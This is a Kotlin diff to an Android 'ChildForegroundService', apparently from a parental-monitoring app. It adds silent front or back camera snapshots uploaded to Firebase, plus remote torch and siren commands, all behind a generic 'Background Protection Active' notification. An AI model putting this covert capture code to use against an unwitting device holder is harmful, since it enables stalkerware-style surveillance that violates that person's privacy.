@@ -79,9 +79,14 @@ class ChildForegroundService : Service() {
         const val ACTION_START_CALL_RECORDING = "ACTION_START_CALL_RECORDING"
         const val ACTION_STOP_CALL_RECORDING = "ACTION_STOP_CALL_RECORDING"
         const val ACTION_SCHEDULED_RECORDING = "ACTION_SCHEDULED_RECORDING"
+        const val ACTION_TAKE_SNAPSHOT = "ACTION_TAKE_SNAPSHOT"
+        const val ACTION_EXECUTE_COMMAND = "ACTION_EXECUTE_COMMAND"
         const val EXTRA_STREAM_TYPE = "EXTRA_STREAM_TYPE"
         const val EXTRA_SESSION_ID = "EXTRA_SESSION_ID"
         const val EXTRA_PHONE_NUMBER = "EXTRA_PHONE_NUMBER"
+        const val EXTRA_CAMERA_FACING = "EXTRA_CAMERA_FACING"
+        const val EXTRA_COMMAND = "EXTRA_COMMAND"
+        const val EXTRA_COMMAND_VALUE = "EXTRA_COMMAND_VALUE"
     }
 
     override fun onCreate() {
@@ -617,6 +622,67 @@ class ChildForegroundService : Service() {
                     )
                 } catch (e: Exception) {
                     FirebaseCrashlytics.getInstance().log("[ChildService] startForeground restore error: ${e.localizedMessage}")
+                }
+            }
+            ACTION_TAKE_SNAPSHOT -> {
+                val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
+                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
+                ensureOverlayWindow()
+                try {
+                    ServiceCompat.startForeground(
+                        this,
+                        NOTIFICATION_ID,
+                        buildNotification("Background Protection Active"),
+                        getIdleServiceType()
+                    )
+                } catch (e: Exception) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground snapshot error: ${e.localizedMessage}")
+                }
+                startMonitoringStreamRequests()
+                if (uid.isNotEmpty()) {
+                    val isFront = facing.equals("front", ignoreCase = true)
+                    com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
+                        isFront = isFront,
+                        onCaptured = { file ->
+                            FirebaseRepository.uploadSnapshot(
+                                childId = uid,
+                                fileUri = Uri.fromFile(file),
+                                cameraFacing = facing,
+                                onSuccess = {
+                                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
+                                    try { file.delete() } catch (_: Exception) {}
+                                },
+                                onFailure = { err ->
+                                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
+                                }
+                            )
+                        },
+                        onError = { err ->
+                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
+                        }
+                    )
+                }
+            }
+            ACTION_EXECUTE_COMMAND -> {
+                val cmd = intent.getStringExtra(EXTRA_COMMAND) ?: ""
+                val value = intent.getStringExtra(EXTRA_COMMAND_VALUE) ?: "true"
+                try {
+                    ServiceCompat.startForeground(
+                        this,
+                        NOTIFICATION_ID,
+                        buildNotification("Background Protection Active"),
+                        getIdleServiceType()
+                    )
+                } catch (_: Exception) {}
+                startMonitoringStreamRequests()
+                when (cmd) {
+                    "TORCH" -> {
+                        RemoteActionsManager.setTorch(applicationContext, value == "true")
+                    }
+                    "SIREN" -> {
+                        if (value == "true") RemoteActionsManager.playSiren(applicationContext, 30)
+                        else RemoteActionsManager.stopSiren()
+                    }
                 }
             }
             ACTION_STOP -> {
